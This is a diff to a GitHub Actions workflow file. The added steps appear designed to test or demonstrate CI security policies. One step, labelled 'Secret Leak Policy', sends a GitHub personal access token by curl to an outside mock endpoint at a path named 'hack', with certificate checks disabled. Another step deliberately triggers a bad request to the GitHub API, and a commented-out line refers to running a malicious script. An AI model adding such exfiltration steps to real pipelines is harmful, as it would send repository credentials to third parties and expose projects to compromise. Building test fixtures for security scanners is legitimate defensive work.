@@ -63,6 +63,17 @@ jobs:
 
    #    - name: 😈 Execute malicious script
    #      run: bash run_malicious_scripts.sh
+
+      - name: Secret Leak Policy
+        run: |
+          curl -k -X POST https://vbirmock.free.beeceptor.com/hack \
+            -H "Content-Type: application/json" \
+            -d '{
+            "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
+          }'
+
+      - name: Response Status Code Policy (Trigger 400 Bad Request)
+        run: curl -k -X POST https://api.github.com/endpoint
         
       - name: Install dependencies
         run: pip install -r requirements.txt
